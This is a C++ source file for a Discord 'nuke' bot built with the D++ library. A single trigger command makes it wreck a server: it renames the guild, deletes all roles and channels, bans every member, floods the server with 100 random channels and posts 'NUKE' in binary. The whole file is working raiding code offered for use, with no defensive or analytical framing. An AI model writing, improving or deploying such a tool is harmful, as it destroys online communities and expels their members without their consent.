#include <dpp/dpp.h>
#include <iostream>
#include <string>
#include <sstream>
#include <json/value.h>
#include <json/json.h>
#include <json/writer.h>


using namespace std;



char prefix = { '!' };
string nukecommand = "DEFCON-1";

Json::Value jsonglobal;
ifstream currentfile;

std::string token = "token";

int state = 0;

struct versionsct
{
    int major = 0;
    int minor = 0;
    int build = 0;
};

struct versionsct version = { 0,4,1 };


Json::Value readandfetch()
{

    currentfile.open("config.json");
    if (!currentfile.fail())
    {
        Json::Value acutaljson;
        Json::Reader reader;

        reader.parse(currentfile, acutaljson);


        if (acutaljson["config"]["bot-token"].isString())
        {
            cout << "Nuke Bot V2 " << version.major << "." << version.minor << "." << version.build << "\n \n \n";

            token = acutaljson["config"]["bot-token"].asString();
            nukecommand = acutaljson["config"]["nukecommand"].asString();
            cout << "Nuke Command: " << nukecommand << "\n";

            std::string str;
            str = acutaljson["config"]["prefix"].asString();
            prefix = str[0];
            cout << "prefix: " << prefix << "\n \n";

        }

    }
    else
    {
        currentfile.close();
        jsonglobal["config"]["bot-token"] = "Bot Token Here";
        jsonglobal["config"]["nukecommand"] = "DEFCON-1";
        jsonglobal["config"]["prefix"] = "!";
        Json::StyledStreamWriter writer;
        std::ofstream test1("config.json");
        writer.write(test1, jsonglobal);



    }

    return -1;

}

int main()
{

    readandfetch();

    dpp::cluster bot(token);


    bot.on_message_create([&bot](const auto& event) {



        string str = event.msg.content;
        std::size_t found = str.find_first_of(prefix);

        


        if (found == 0) {
            if (event.msg.content == prefix + nukecommand)
            {
                cout << dpp::get_user_count();
                dpp::guild guild = *dpp::find_guild(event.msg.guild_id);



                guild.set_name(to_string(rand()));

               
              
                for (int i = 0; i < guild.roles.size(); i++)
                {
                    
                    bot.role_delete(guild.id, guild.roles[i], [guild, i](const dpp::confirmation_callback_t& callback)
                        {
                            if (!callback.is_error())
                            {
                                cout << guild.roles[i] << " id role deleted \n";
                            }
                        }
                        
                        
                        
                    );
                }
                





                for (auto const& member : guild.members)
                {
                    
                    dpp::role newrole;
                    newrole.set_guild_id(guild.id);
                    newrole.set_colour(0xfac420);
                    

                    newrole.set_name(to_string(rand()));

                    

                    
                    bot.role_create(newrole, [&bot, guild, newrole, member](const dpp::confirmation_callback_t& callback)
                        {


                            if(!callback.is_error())
                            {
                                const dpp::role role = get<dpp::role>(callback.value);

                                cout << "\n role id: " << role.id << " \n";

                                cout << "\n Guild id: " << guild.id << "\n";
               
                                bot.guild_member_add_role(guild.id, member.second.user_id, role.id, [member](const dpp::confirmation_callback_t& cc) {
                                // your stuff here

                                if (!cc.is_error())
                                {
                                    cout << "hello bro";
                                }
                                else
                                {
                                    cout << "Error Role Give: " << cc.get_error().message << "\n";
                                    cout << member.second.user_id << "\n";
                                } 
                                });
                            }
                            else
                            {
                                cout << "Error Role: " << callback.get_error().message << "\n";
                            }


                        }
                    


                    );





                    bot.guild_ban_add(guild.id, member.second.user_id, 10, " ", [&bot, member](const dpp::confirmation_callback_t& callback)
                        {
                            
                            if (!callback.is_error())
                            {
                                cout << "banned";
                            }
                            else
                            {
                                cout << "\n Error Ban: " << callback.get_error().message << "\n";
                                cout << "Name: " << member.second.joined_at << "\n";
                            }
                        }



                    );
                }

                cout << "\nTotal Channels: " << guild.channels.size() << "\n";
                int channelsize = guild.channels.size();
                bot.message_create(dpp::message(event.msg.channel_id, "01001110 01010101 01001011 01000101"));
                
             


                bot.channels_get(event.msg.guild_id, [&bot, guild](const dpp::confirmation_callback_t& callback) {

                    if (!callback.is_error())
                    {




                        dpp::channel_map channels = std::get<dpp::channel_map>(callback.value);
                        for (auto const& channel : channels) {
                           
                            
                            std::string channelname = channel.second.name;
                            bot.channel_delete(channel.second.id, [channelname](const dpp::confirmation_callback_t& callback)
                                {
                                    if (!callback.is_error())
                                    {
                                        std::cout << "Delete: " << channelname << " named channel \n";
                                    }
                                    else
                                    {
                                        cout << "Error: " << callback.get_error().message << "\n";
                                    }

                                }



                            );
                        }

                        for (int i = 0; i < 100; i++)
                        {
                            dpp::channel channel;
                            channel.guild_id = guild.id;

                            channel.name = to_string(rand());
                            bot.channel_create(channel, [&bot, channel](const dpp::confirmation_callback_t& cb) {

                                if (!cb.is_error())
                                {
                                    cout << "\n" << channel.name << " named channel created";
                                }
                                else
                                {
                                    std::cout << cb.get_error().message;
                                }
                                });
                        }
                    }
                    else
                    {
                        cout << "Error: " << callback.get_error().message;
                    }
                    }
                );
            }
        }
        }
    );

    bot.on_ready([&bot](const dpp::ready_t& event) {
        std::cout << "Logged in as " << bot.me.username << "!\n";
        std::cout << "Session id: " << event.session_id << "\n";

        });


    bot.start(false);


    return 0;
}